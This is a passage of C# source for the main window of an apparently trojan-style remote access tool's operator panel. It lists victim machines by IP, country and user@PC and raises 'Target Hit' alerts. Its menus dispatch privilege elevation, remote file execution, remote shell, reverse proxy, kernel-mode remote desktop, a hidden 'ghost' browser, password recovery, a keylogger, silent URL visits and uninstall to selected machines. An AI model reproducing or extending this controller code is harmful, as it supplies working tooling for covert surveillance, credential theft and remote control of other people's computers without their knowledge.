        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                string uuid = client.Value.Id;
                var lvi = GetListViewItemByUuid(uuid);
                string serverTag = _clientDb.GetClientTag(uuid);
                if (string.IsNullOrWhiteSpace(serverTag))
                    serverTag = client.Value.Tag ?? "";
                string warsalDisplay = _clientDb.GetClientWarsalDisplayString(uuid);

                string existingUserStatus = "Active";

                var row = _clientDb.UpsertClientBasics(
                    uuid,
                    client.EndPoint.Address.ToString(),
                    serverTag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    "Disconnected",
                    existingUserStatus,
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        if (lvi == null)
                            return;

                        lvi.Tag = null;              // keep history, but don't allow actions
                        lvi.ImageIndex = -1;
                        lvi.SubItems[0].Text = uuid;
                        lvi.SubItems[1].Text = "Disconnected";
                        lvi.SubItems[3].Text = FormatNullableUtc(row.InstallTimeUtc);
                        lvi.SubItems[4].Text = FormatNullableUtc(row.LastPingTimeUtc);
                        lvi.SubItems[5].Text = client.Value.Version;
                        lvi.SubItems[6].Text = client.Value.CountryWithCode;
                        lvi.SubItems[IP_ADDRESS_ID].Text = " " + client.EndPoint.Address;
                        lvi.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
                        lvi.SubItems[8].Text = client.Value.OperatingSystem;
                        lvi.SubItems[WARSAL_ID].Text = warsalDisplay;
                        lvi.SubItems[TAG_ID].Text = serverTag;
                        lvi.SubItems[11].Text = client.Value.AccountType;
                        lvi.SubItems[12].Text = client.Value.UserAtPc;
                    }
                });
                UpdateWindowTitle();
                ApplyFilters(reloadFromDb: false);
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[STATUS_ID].Text = text;

                _clientDb.UpsertClientBasics(
                    client.Value.Id,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    text,
                    "",
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);
                ApplyFilters(reloadFromDb: false);
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                _clientDb.UpsertClientBasics(
                    client.Value.Id,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    item.SubItems[STATUS_ID].Text,
                    userStatus.ToString(),
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);
            }
        }

        private void SetPingByClient(object sender, Client client, DateTime pingTimeUtc, ClientPingRequest ping)
        {
            if (client == null || client.Value == null) return;

            string uuid = client.Value.Id;
            if (string.IsNullOrWhiteSpace(uuid)) return;

            bool acceptPing = _clientDb.GetClientAcceptPing(uuid);
            _clientDb.UpdateClientLastPingTimeUtc(uuid, pingTimeUtc);

            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(pingTimeUtc);
            }
            UpdateStatusCounts();

            /* Always show a toast on ping, regardless of Accept Ping. */
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    string ip = client.EndPoint?.Address?.ToString() ?? "";
                    string who = client.Value.UserAtPc;
                    if (string.IsNullOrWhiteSpace(who) || who.Trim() == "@")
                        who = string.IsNullOrWhiteSpace(client.Value.Username) ? (uuid ?? "Client") : $"{client.Value.Username}@{client.Value.PcName}";
                    bool isTargetHit = ping?.TargetHit ?? false;
                    string status = acceptPing ? "accepted" : "ignored";
                    notifyIcon.ShowBalloonTip(
                        2000,
                        isTargetHit ? "Target Hit" : "Ping received",
                        isTargetHit
                            ? $"{who} ({ip}) target hit at {FormatNullableUtc(pingTimeUtc)}"
                            : $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
                        ToolTipIcon.Info);
                });
            }
            catch
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;
            return GetListViewItemByUuid(client.Value?.Id);
        }

        private ListViewItem GetListViewItemByUuid(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return null;

            ListViewItem itemClient = null;
            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null
                        && lvi.SubItems.Count > UUID_ID
                        && string.Equals(lvi.SubItems[UUID_ID].Text, uuid, StringComparison.OrdinalIgnoreCase));
            });
            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client)
                            .Where(c => c != null));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        private void LoadClientsFromDatabase()
        {
            try
            {
                _loadingDbRows = 1;
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Clear();
                        var rows = _clientDb.LoadAllClients();
                        foreach (var r in rows)
                        {
                            string countryWithCode = string.IsNullOrWhiteSpace(r.CountryCode)
                                ? r.Country
                                : $"{r.Country} [{r.CountryCode}]";

                            var lvi = new ListViewItem(new string[]
                            {
                                r.Uuid ?? "",                          // 0  Uuid
                                r.Status ?? "Disconnected",            // 1  Status
                                "",                                    // 2  Accept Ping (checkbox)
                                FormatNullableUtc(r.InstallTimeUtc),   // 3  Install
                                FormatNullableUtc(r.LastPingTimeUtc),  // 4  Last Ping
                                r.Version ?? "",                       // 5  Version
                                countryWithCode,                       // 6  Country
                                " " + (r.IpAddress ?? ""),             // 7  IP Address
                                r.OperatingSystem ?? "",               // 8  OS
                                r.Warsals ?? "",                       // 9  Warsal
                                r.Tag ?? "",                           // 10 Tag
                                r.AccountType ?? "",                   // 11 Account Type
                                r.UserPc ?? ""                         // 12 User@PC
                            })
                            {
                                Tag = null,
                                ImageIndex = -1
                            };
                            lvi.SubItems[ACCEPT_PING_ID].Tag = r.AcceptPing;
                            lvi.SubItems[IP_ADDRESS_ID].Tag = r.ImageIndex;

                            lstClients.Items.Add(lvi);
                        }
                    }
                });
                _loadingDbRows = 0;
                ApplyFilters(reloadFromDb: false);
            }
            catch (Exception)
            {
                // Non-fatal: UI will still update from connected clients.
                _loadingDbRows = 0;
                UpdateStatusCounts();
            }
        }

        private static string FormatNullableUtc(DateTime? dtUtc)
        {
            if (dtUtc == null) return string.Empty;
            try
            {
                // Show local time for easier reading.
                return dtUtc.Value.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
            }
            catch
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                /* Close ghost browser window on client before disconnecting. */
                c.Send(new DoCloseHiddenBrowser());
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        private string[] GetSelectedUuidsFromListview()
        {
            List<string> uuids = new List<string>();
            if (lstClients.SelectedItems.Count == 0) return new string[0];

            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                if (lvi == null) continue;
                if (lvi.SubItems.Count <= UUID_ID) continue;
                string uuid = lvi.SubItems[UUID_ID].Text;
                if (string.IsNullOrWhiteSpace(uuid)) continue;

                bool exists = false;
                foreach (var u in uuids)
                {
                    if (string.Equals(u, uuid, StringComparison.OrdinalIgnoreCase))
                    {
                        exists = true;
                        break;
                    }
                }
                if (!exists) uuids.Add(uuid);
            }

            return uuids.ToArray();
        }

        private void deleteFromDbToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string[] uuids = GetSelectedUuidsFromListview();
            if (uuids.Length == 0) return;

            if (MessageBox.Show(
                    string.Format("Delete {0} client entr{1} from the database?", uuids.Length, (uuids.Length == 1 ? "y" : "ies")),
                    "Delete from DB", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                return;

            foreach (string uuid in uuids)
                _clientDb.DeleteClient(uuid);

            LoadClientsFromDatabase();
        }

        #endregion

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
            }
        }

        #endregion

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c, RemoteControlMode.User);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void remoteDesktopKernelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c, RemoteControlMode.Kernel);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hiddenBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frm = FrmHiddenBrowser.CreateNewOrGetExisting(c);
                frm.Show();
                frm.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        #endregion

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion
    }
}